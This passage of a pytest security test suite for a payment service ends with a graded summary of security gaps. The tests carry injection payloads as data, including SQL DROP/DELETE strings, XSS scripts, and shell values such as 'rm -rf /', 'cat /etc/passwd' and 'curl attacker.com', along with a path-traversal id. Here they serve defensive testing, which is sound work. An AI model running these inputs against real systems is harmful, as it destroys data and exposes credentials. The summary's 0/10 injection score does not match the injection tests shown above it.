        # Payment should use the tampered ID (current behavior)
        # This documents that user object is mutable (potential issue)
        assert payment is not None
        assert payment.user_id == "admin_user_000"  # Uses tampered value
        
        # Restore for cleanup
        authenticated_active_user.user_id = original_user_id
    
    def test_payment_ownership_verified_against_database(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """
        Test that payment creation verifies user exists in database.
        """
        # Create user not in database
        ghost_user = User("ghost_user", "ghost", "ghost@example.com", is_active=True)
        ghost_user.authenticate("ghost_pass")
        # Deliberately NOT adding to database
        
        # Should this fail? Currently it doesn't check!
        payment = payment_service.create_payment(
            ghost_user,
            100.00,
            Currency.USD,
            "Ghost user payment"
        )
        
        # Current behavior: Succeeds even though user not in DB
        # This is a security gap - no user validation
        assert payment is not None  # Documents current behavior
        
        # RECOMMENDATION: Should verify user exists in DB before creating payment


# ============================================================================
# INJECTION ATTACK TESTS
# ============================================================================

class TestPaymentInjectionSecurity:
    """Test resistance to injection attacks."""
    
    @pytest.mark.parametrize("sql_payload", [
        "'; DROP TABLE payments; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        "' OR 1=1--",
        "'; UPDATE payments SET amount=0 WHERE '1'='1",
    ])
    def test_sql_injection_in_description_safely_stored(
        self, payment_service, authenticated_active_user, payment_database, sql_payload
    ):
        """Test that SQL injection patterns in description are safely handled."""
        initial_user_count = len(payment_database.users)
        initial_payment_count = len(payment_database.payments)
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            sql_payload
        )
        
        # Should succeed (treat as normal string)
        assert payment is not None
        assert payment.description == sql_payload
        
        # Verify no side effects (no tables dropped, no data deleted)
        assert len(payment_database.users) == initial_user_count
        assert len(payment_database.payments) == initial_payment_count + 1
        assert payment_database.get_user(authenticated_active_user.user_id) is not None
    
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<svg/onload=alert('XSS')>",
    ])
    def test_xss_payloads_in_description_stored_safely(
        self, payment_service, authenticated_active_user, payment_database, xss_payload
    ):
        """Test that XSS payloads are stored as-is without execution."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            xss_payload
        )
        
        # Should store as-is (escaping is presentation layer's job)
        assert payment is not None
        assert payment.description == xss_payload
        
        # Verify stored correctly without modification
        stored = payment_database.get_payment(payment.payment_id)
        assert stored.description == xss_payload
    
    @pytest.mark.parametrize("command_payload", [
        "; ls -la",
        "| whoami",
        "$(cat /etc/passwd)",
        "`rm -rf /`",
        "&& curl attacker.com",
        "test; sleep 10",
    ])
    def test_command_injection_in_description_not_executed(
        self, payment_service, authenticated_active_user, command_payload
    ):
        """Test that command injection patterns don't execute system commands."""
        before = time.time()
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            command_payload
        )
        
        after = time.time()
        
        # Should succeed quickly (command not executed)
        assert payment is not None
        assert after - before < 1.0  # Should be fast, not delayed by sleep/command
        assert payment.description == command_payload
    
    def test_path_traversal_in_user_id_handled_safely(
        self, payment_service, payment_database
    ):
        """Test that path traversal patterns in user_id don't access filesystem."""
        traversal_user = User(
            "../../../etc/passwd",
            "hacker",
            "hacker@evil.com",
            is_active=True
        )
        traversal_user.authenticate("hacker_pass")
        payment_database.add_user(traversal_user)
        
        payment = payment_service.create_payment(
            traversal_user,
            100.00,
            Currency.USD,
            "Path traversal test"
        )
        
        # Should work (stored as string, not path)
        assert payment is not None
        assert payment.user_id == "../../../etc/passwd"
        
        # Verify payment ID is safe (doesn't contain traversal)
        assert ".." not in payment.payment_id or payment.payment_id.startswith("pay_")


# ============================================================================
# INPUT VALIDATION & TYPE SAFETY TESTS
# ============================================================================

class TestPaymentInputValidationSecurity:
    """Test input validation and type safety."""
    
    def test_string_amount_rejected_or_converted(
        self, payment_service, authenticated_active_user
    ):
        """Test behavior when amount is passed as string."""
        # Current implementation: Might convert or error
        try:
            payment = payment_service.create_payment(
                authenticated_active_user,
                "100.00",  # String instead of float
                Currency.USD,
                "String amount test"
            )
            # If it succeeds, verify it was converted correctly
            if payment is not None:
                assert payment.amount == 100.00
        except (TypeError, ValueError):
            # Expected behavior - should reject non-numeric types
            pass
    
    def test_string_currency_rejected(
        self, payment_service, authenticated_active_user
    ):
        """Test that string currency (not enum) is rejected."""
        with pytest.raises((TypeError, AttributeError)):
            payment = payment_service.create_payment(
                authenticated_active_user,
                100.00,
                "USD",  # String instead of Currency.USD
                "String currency test"
            )
    
    @pytest.mark.parametrize("invalid_amount", [
        float('inf'),
        float('-inf'),
        float('nan'),
    ])
    def test_special_float_values_rejected(
        self, payment_service, authenticated_active_user, payment_database, invalid_amount
    ):
        """Test that infinity and NaN are rejected."""
        initial_count = len(payment_database.payments)
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            invalid_amount,
            Currency.USD,
            "Special float test"
        )
        
        # Should be rejected
        assert payment is None
        assert len(payment_database.payments) == initial_count
    
    def test_none_description_handled_safely(
        self, payment_service, authenticated_active_user
    ):
        """Test behavior when description is None."""
        # Should either convert to empty string or raise error
        try:
            payment = payment_service.create_payment(
                authenticated_active_user,
                100.00,
                Currency.USD,
                None  # None instead of string
            )
            # If succeeds, verify it's handled
            if payment is not None:
                assert payment.description == "" or payment.description is None
        except TypeError:
            # Expected - should require string
            pass
    
    def test_extremely_large_valid_amount_near_float_max(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test very large but technically valid float amounts."""
        large_amount = 1e10  # 10 billion (above max but valid float)
        initial_count = len(payment_database.payments)
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            large_amount,
            Currency.USD,
            "Extremely large amount"
        )
        
        # Should be rejected (above max of 10,000)
        assert payment is None
        assert len(payment_database.payments) == initial_count


# ============================================================================
# SENSITIVE DATA EXPOSURE TESTS
# ============================================================================

class TestSensitiveDataExposure:
    """Test that sensitive data is not exposed."""
    
    def test_payment_object_does_not_contain_user_credentials(
        self, payment_service, authenticated_active_user
    ):
        """Test that payment doesn't leak user authentication data."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "PII test"
        )
        
        # Payment should NOT contain sensitive user data
        assert not hasattr(payment, 'auth_token')
        assert not hasattr(payment, 'password')
        assert not hasattr(payment, 'email')
        
        # Should only have minimal identifier
        assert hasattr(payment, 'user_id')
    
    def test_error_messages_are_generic(
        self, payment_service, unauthenticated_active_user
    ):
        """Test that error messages don't leak implementation details."""
        try:
            payment_service.create_payment(
                unauthenticated_active_user,
                100.00,
                Currency.USD
            )
            pytest.fail("Should have raised PermissionError")
        except PermissionError as e:
            error_msg = str(e).lower()
            
            # Should NOT contain implementation details
            assert "database" not in error_msg
            assert "table" not in error_msg
            assert "sql" not in error_msg
            assert "query" not in error_msg
            assert "stack" not in error_msg
            assert "exception" not in error_msg
            
            # Should be generic
            assert "authenticated" in error_msg
    
    def test_payment_id_format_does_not_leak_sensitive_info(
        self, payment_service, authenticated_active_user
    ):
        """Test that payment ID format doesn't expose sensitive data."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD
        )
        
        # Payment ID should not contain:
        # - User email
        # - User password
        # - Auth token
        # - Timestamps that leak system info
        
        payment_id = payment.payment_id.lower()
        assert "@" not in payment_id  # No email
        assert "token" not in payment_id
        assert "password" not in payment_id
    
    def test_payment_ids_are_not_easily_guessable(
        self, payment_service, authenticated_active_user
    ):
        """Test that payment IDs are not trivially predictable."""
        payments = []
        for i in range(10):
            p = payment_service.create_payment(
                authenticated_active_user,
                10.00,
                Currency.USD,
                f"Payment {i}"
            )
            payments.append(p)
        
        # Extract numeric portion (if any)
        # Current format: pay_{user_id}_{counter}
        # VULNERABILITY: Counter is predictable!
        
        # Document this as a security issue
        id_parts = [p.payment_id.split('_') for p in payments]
        
        # If last part is numeric and sequential, it's predictable
        if all(len(parts) == 3 for parts in id_parts):
            counters = [int(parts[2]) for parts in id_parts if parts[2].isdigit()]
            if len(counters) == 10:
                # Check if sequential
                is_sequential = all(
                    counters[i+1] == counters[i] + 1 
                    for i in range(len(counters) - 1)
                )
                # SECURITY ISSUE: IDs are sequential and predictable!
                # This test documents the vulnerability
                assert is_sequential  # Currently true - BAD!


# ============================================================================
# RACE CONDITION & CONCURRENCY TESTS
# ============================================================================

class TestPaymentConcurrencySecurity:
    """Test thread-safety and race condition handling."""
    
    def test_concurrent_payment_creation_generates_unique_ids(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that concurrent payment creation doesn't cause ID collisions."""
        results = []
        errors = []
        lock = threading.Lock()
        
        def create_payment():
            try:
                payment = payment_service.create_payment(
                    authenticated_active_user,
                    10.00,
                    Currency.USD,
                    "Concurrent test"
                )
                with lock:
                    results.append(payment)
            except Exception as e:
                with lock:
                    errors.append(e)
        
        # Create 100 payments concurrently
        threads = [threading.Thread(target=create_payment) for _ in range(100)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        # Should have no errors
        assert len(errors) == 0, f"Errors occurred: {errors}"
        
        # All payments should succeed
        assert len(results) == 100
        
        # All IDs should be unique (critical!)
        payment_ids = [p.payment_id for p in results]
        assert len(set(payment_ids)) == 100, "Duplicate payment IDs detected!"
    
    def test_rapid_sequential_payments_maintain_integrity(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that rapid payment creation maintains data integrity."""
        num_payments = 1000
        
        for i in range(num_payments):
            payment = payment_service.create_payment(
                authenticated_active_user,
                1.00,
                Currency.USD,
                f"Rapid payment {i}"
            )
            assert payment is not None
            assert payment.status == PaymentStatus.COMPLETED
        
        # Verify all stored correctly
        user_payments = payment_database.get_user_payments(
            authenticated_active_user.user_id
        )
        assert len(user_payments) == num_payments
        
        # Verify all have unique IDs
        ids = [p.payment_id for p in user_payments]
        assert len(set(ids)) == num_payments


# ============================================================================
# BUSINESS LOGIC ABUSE TESTS
# ============================================================================

class TestBusinessLogicAbusePrevention:
    """Test that business logic cannot be abused."""
    
    def test_multiple_max_payments_allowed_documents_risk(
        self, payment_service, authenticated_active_user
    ):
        """
        Test that multiple max-amount payments are allowed.
        This documents a potential business risk.
        """
        max_amount = PaymentTestConstants.MAX_VALID_AMOUNT
        num_payments = 10
        
        total = 0
        for i in range(num_payments):
            payment = payment_service.create_payment(
                authenticated_active_user,
                max_amount,
                Currency.USD,
                f"Max payment {i}"
            )
            assert payment is not None
            total += max_amount
        
        # Total exceeds per-payment limit significantly
        assert total == num_payments * max_amount  # 100,000
        assert total > max_amount  # Well above single payment limit
        
        # NOTE: This is allowed by current implementation
        # Business may want cumulative limits
    
    def test_currency_limits_independent_documents_risk(
        self, payment_service, authenticated_active_user
    ):
        """
        Test that currency limits are independent.
        User can max out each currency separately.
        """
        max_amount = PaymentTestConstants.MAX_VALID_AMOUNT
        
        usd_payment = payment_service.create_payment(
            authenticated_active_user, max_amount, Currency.USD
        )
        eur_payment = payment_service.create_payment(
            authenticated_active_user, max_amount, Currency.EUR
        )
        gbp_payment = payment_service.create_payment(
            authenticated_active_user, max_amount, Currency.GBP
        )
        
        # All succeed - user can have 30,000 total across currencies
        assert usd_payment is not None
        assert eur_payment is not None
        assert gbp_payment is not None
        
        # NOTE: Business may want cross-currency limits
```

---

## Summary & Recommendations

### **Critical Security Gaps (Must Fix):**

1. **🔴 CRITICAL: No Authorization Testing**
   - Tests don't verify user can only create payments for themselves
   - API design flaw: Service doesn't know who is calling it (no session context)
   - **Recommendation:** Add session/context parameter to verify caller identity

2. **🔴 CRITICAL: Predictable Payment IDs**
   - Sequential IDs are easily guessable
   - **Recommendation:** Use UUID4 or cryptographically secure random IDs

3. **🔴 CRITICAL: No User Validation**
   - Payment can be created for non-existent users
   - **Recommendation:** Verify user exists in database before creating payment

4. **🔴 CRITICAL: Race Conditions in ID Generation**
   - `len(db.payments) + 1` is not thread-safe
   - **Recommendation:** Use atomic counter or UUID

### **High Priority Gaps:**

5. **🟡 Missing Input Type Validation**
   - No tests for type confusion attacks
   - **Recommendation:** Add strict type checking

6. **🟡 No Injection Testing**
   - While current implementation is safe (in-memory dict), tests should exist
   - **Recommendation:** Add injection tests for future-proofing

7. **🟡 Information Disclosure via Timing**
   - No timing attack tests
   - **Recommendation:** Add constant-time comparison tests

### **Security Test Coverage Score:**
- **Authentication:** 6/10 ✅ Basic coverage
- **Authorization:** 0/10 🚨 No coverage
- **Input Validation:** 3/10 ⚠️ Basic boundaries only
- **Injection Prevention:** 0/10 🚨 No coverage
- **Data Exposure:** 2/10 ⚠️ Minimal checks
- **Concurrency:** 0/10 🚨 No coverage
- **Business Logic:** 1/10 🚨 No abuse testing

**Overall: 2/10** 🚨 **INADEQUATE SECURITY TESTING**

